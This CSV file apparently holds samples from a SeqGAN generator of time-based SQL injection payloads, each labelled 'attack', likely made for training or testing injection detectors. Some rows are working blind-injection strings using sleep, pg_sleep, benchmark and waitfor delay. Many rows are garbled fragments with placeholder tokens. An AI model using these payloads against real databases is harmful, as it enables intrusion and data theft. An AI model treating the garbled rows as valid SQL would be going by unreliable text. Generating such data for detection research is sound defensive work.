label,payload,family,payload_type,method,run_id,sample_index
attack,",waitforor sleep  (  5  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,353
attack,"'1 where 7260  =  ' 50  = * _____TIME_____TIME_____TIMD5  ,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,354
attack,1%'   )    )    )    or sleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,355
attack,1   )    )    )    )    )    and sleep  (  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,356
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""bace ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,357
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""c it",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,358
attack,"1% waitfor rl not  (  10000000,MD5(  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,359
attack, )    and 2388  benchmark  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,360
attack,sleep fromu,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,361
attack,""" or sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,362
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,363
attack,"1'  'isintegratedsecurityonly'""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cno",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,364
attack,; if 2388  =    )    (    )    )    )    )    )    )    or 4240 from   =  ' 9443 benchmark  (   (    __TIME______  IME___TIME_____TIME__  )    =   )    =   then  (  substring   )    (    )    )    )    )    gsleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,365
attack,"1%'%""  )   rlike sleep  (  5  )   and   (  ""%' waitfor delay '0A;0)    )    )    <> 'sa'  sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,366
attack,"' waitfor delay '0)    )    )    =    else""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""be25",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,367
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwcciqo)    )    and    (    )    )    )    )    0x544d5a4c   )    selector sleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,368
attack,1'  3114  )   <>  from   )    )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,369
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%'   6456 if not   )    )    );1   )    )    )    )    )    )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,370
attack,;waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,371
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,372
attack,1'  cst6272  )   ;waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,373
attack,; or sleep  (  5  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,374
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%bfor sleep  (  (  __TIME_______TIME___  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,375
attack,"; or 9443 4240 from 8514  =  sleep  )  sleep,sleep  (  5   )    )    )    )    )    )   end  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,376
attack,"1""  )   rlike sleep  (  5  )   and   (  ""%%""  )   rlike sleep  (  5  )   and   (  ""'   )    )    rlike sleep  (  5  )   and    (    (   '%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,377
attack," )    )    or sleep  (  __TIME____TIME_____TIME____TIME_____TIME___  ),do,sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,378
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """"   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,379
attack,1 where 6784  =  sleep    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,380
attack,", if not  (  '  )     ,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,381
attack, )    )    or pg_sleep  (  __  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,382
attack,", * from @(  select --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,383
attack," )    )    or sleep  (  __TIME____TIME____TI,ME____TIME__  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,384
attack,)    )    or benchmark  (  sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,385
attack,"1   )    )    )    )    and    @sleep  (  5000000,sleep  (  ___TIME___  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,386
attack,"1%"" or 4240 8514=    select *  =    (  5   )    )    )    )    )     )    )    and 42403824  benchmark  (  __TIME__TIME__  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,387
attack,"1%""  )3824   )    )    _sddododo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,388
attack,1'  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,389
attack,"1%%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  =  ""' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,390
attack, 6784--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,391
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'iq if1 f )    )    or elt  (  3114  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,392
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,393
attack,' 0)    )    )    )    )    )    fromals peroo sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,394
attack,"1""   )    )    =%as xio  select not  (  9443  ,ME__  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,395
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   't""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,396
attack,"1%""  )   )    or sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,397
attack,"1%'   )    )    )    )    or 4240 pg_sleep  ___TIME_____T,vwhen   (    )    (    )    )    )    )    or pg_sleep (  sleep  (  substring   )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,398
attack,1    )    )    as kalrcohv where 8781 el b  =  3114    =  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,399
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ba""  =  ""bsernot8466:edcon  (  )    )    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,400
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,401
attack,1'  )   waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,402
attack,1'  )    )    )    )    or sleep  (  )   )    =    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,403
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,404
attack,1%'   )    )    and benchmark  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,405
attack,", 1' where benchmark  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,406
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,407
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,408
attack,"1%""   )    )    or sleep  (  __TIME__  )    =  ""   then  '  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,409
attack,or 8514  (  sleep  (  __TIME____TIME_______)    )    =  substring%'  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,410
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,411
attack," )    )    or sleep  (  3114,sleep  (  )     ,sleep  (  __TIME_______TIME__  )    =  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,412
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,413
attack,1'  )    )    )    <> if dwaitfor from @versps 3885 1361=    _serdnon #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,414
attack,f pg_sleep  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,415
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,416
attack,"1'||  (  select 'f'   )    )    rlike sleep  (  5  )   and    (    (   'rc.cocneo,1  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,417
attack,1'   )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,418
attack,1'  )    )    )    or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,419
attack,1%'   )    )    )    or sleep  (  5   )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,420
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,421
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,422
attack,1%'   )    )    or @sleep  (  =____TIME_____TIME_____TIME______TIME_____TIME__  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,423
attack,1'   )    )    <>b'sa' or sleep  (  _______TIM_  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,424
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,425
attack, 'sa' not  (  __TIMD5  =   )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,426
attack,1'  )   waitfor and 8514  =    (  select 4240 from benchmark  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,427
attack,' or not  5  )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,428
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,429
attack,; if not  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,430
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,431
attack,"1%""   )    )    )    and    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,432
attack,"do, 50) or pg_sleep  (  sleep  (  select  (  5   )    )    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,433
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,434
attack,"1%""  )   wherea  if not 6793  (  6272,sleep  (  substring   (  select 4240 9443,sleep  (  3114,sleep  (  5   )    )    )    )    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,435
attack,"1%%where""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,436
attack,1'  )   )    )   waitforor pg_sleep  (_  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,437
attack,",select information_schema7629 from 50s dverprowaitfor delay delay_TIME__)  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,438
attack,;@ 7260 benchmark  (  substring   (    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,439
attack,or 2388  =    ___  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,440
attack,", or benchmark  (  __TIME__)  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,441
attack,"1'  )    )    or benchmark  (  ___TI_____TIME__  )____TIME_____TIME_____TIME___  substring  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,442
attack,"or benchmark  (  5000000,m_  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,443
attack,"o,waitfor from pg_sleep  (  __TIME______TIME__  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,444
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,445
attack,1   )    )    )    as zope where 7260 '0:0:2' from *pg_sleep  (  (  __TIME_____'enpn' #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,446
attack,1' where 6784  =    )    )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,447
attack,1'  ) or sleep  (  sleep  (  ___TIME__--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,448
attack,"1""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,449
attack,"1%""  )   rlike sleep  (  5  )   and   (  """"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  =  ""t_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,450
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cne'   )    )    rlike sleep  (  5  )   and    (    (   ' where 5702 7629 pl from pg_sleep  (  5,sleep  (  3114,sleep  =  ' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,451
attack,1%' where 3885  =  ' delayu-- 2388  =    __TIME_____TIME_____)    =  '_)    )    )    )    =   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,452
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%'s  'sysadmin'  )   waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,453
attack,"1%"")    )    )    or sleep  (  5   )    )    )    )    )    or 9443sleep  (  5  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,454
attack,"1%select%"" 0)    )    )    )    or 4240  (  benchmark  10000000,ME________TIME_____TIME_______TIME______TIME__  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,455
attack," ,1 s bedn  )ler  )  or benchmark  (  __TIME___TIME___)  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,456
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%bfa""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,457
attack,  )    )    or 8594 from 4240  =    '  )    (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,458
attack,"1'  )   )    )    or 8514  =   from   (    select delay when   =    _TIME__  5  ),1  )   )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,459
attack,or sleep  (  __TIME__)  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,460
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%z'   )    )    )    or 9443  =  '   =    )    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,461
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  ""bacdor pg_sleep  (  'sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,462
attack,1'   )    )    )    or sleep  (  9443_____TIME___  )<>,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,463
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,464
attack,1 where 5466  )    =  '  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,465
attack,"1""or pg_sleep 50  ___select like and(   )    )    )    )    )    )    )    )    )    )    <>%   )    )     )    and benchmark  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,466
attack,"1%"" where 5466  =  vu--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,467
attack,"1%""   6866   )    )    or 8514  =   =    (    6866* from   )    =    )    )    )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,468
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,469
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%or sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,470
attack, or benchmark  (  __TIME_______TIME______TIME_______  select__TIME__  )  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,471
attack,"1%' where "" like ""7260 3824  =    ___TIMDE__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,472
attack, )    )    or sleep    (  __TIM___TIME____,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,473
attack,"1%""   )    )    )    or   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,474
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  """"  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,475
attack,1%'    )   or sleep  (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,476
attack,"1%%""  )   rlike sleep  (  5  )   and   (  ""    1361  )    or sleep  (  ___TIME_____TIME_____TIME_____TIME__)  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,477
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,478
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   ' q if r '0:0:10'"" or sleep  (  __TIME__  )    =  """"  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,479
attack,", if '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,480
attack,"1%%""  )   rlike sleep  (  5  )   and   (  ""%""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,481
attack,"""   )    )    )    or sleep  (  __TIME__TIME_____TIME_____TIME_____TIME_________TIME_____TIME__)  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,482
attack,1    )    )    or 9443 sleep  (  0x4c4d6142--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,483
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,484
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,485
attack,1 where 5702=  7260 )  sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,486
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c e where 9862=  select  =    ___TIME_______TIME__)  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,487
attack, )    )   or   (    )    )    )    )    )    )24#,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,488
attack,"""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,489
attack,rct'  =  'i 8(  select or benchmark  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,490
attack, s )    )    and   (    select * from   )    )    =   )    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,491
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%"" or sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,492
attack,1' where 6784  =  1361 delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,493
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%';waitfor and elo and 2388  (  sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,494
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""hbxi""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,495
attack,'   waitfor delay 1361 ----,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,496
